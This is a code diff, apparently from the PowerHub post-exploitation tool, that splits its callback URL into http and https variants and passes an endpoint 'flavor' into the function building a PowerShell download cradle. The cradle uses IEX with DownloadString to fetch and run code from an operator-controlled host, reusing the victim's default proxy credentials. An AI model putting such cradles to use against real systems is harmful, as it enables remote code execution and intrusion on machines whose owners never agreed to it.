@@ -86,12 +86,18 @@ class Module(object):
 
 modules = import_modules()
 
-callback_url = '%s://%s:%d/%s' % (
-    args.PROTOCOL,
-    args.URI_HOST,
-    args.URI_PORT,
-    args.URI_PATH+'/' if args.URI_PATH else '',
-)
+callback_urls = {
+    'http': 'http://%s:%d/%s' % (
+        args.URI_HOST,
+        args.URI_PORT if args.URI_PORT else args.LPORT,
+        args.URI_PATH+'/' if args.URI_PATH else '',
+    ),
+    'https': 'https://%s:%d/%s' % (
+        args.URI_HOST,
+        args.URI_PORT if args.URI_PORT else args.SSL_PORT,
+        args.URI_PATH+'/' if args.URI_PATH else '',
+    ),
+}
 
 # TODO consider https
 webdav_url = 'http://%s:%d/webdav' % (
@@ -105,7 +111,7 @@ endpoints = {
 }
 
 
-def build_cradle(get_args):
+def build_cradle(get_args, flavor="hub"):
     result = ""
     from powerhub.tools import FINGERPRINT
     if get_args['GroupTransport'] == 'https':
@@ -130,7 +136,10 @@ def build_cradle(get_args):
                        "$K.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
         result += "IEX $K.DownloadString(\"%s%s\");"
-        result = result % (callback_url, '0')
+        result = result % (
+            callback_urls[get_args['GroupTransport']],
+            endpoints[flavor],
+        )
 
     if get_args['GroupLauncher'] == 'cmd':
         result = result.replace('"', '\\"')
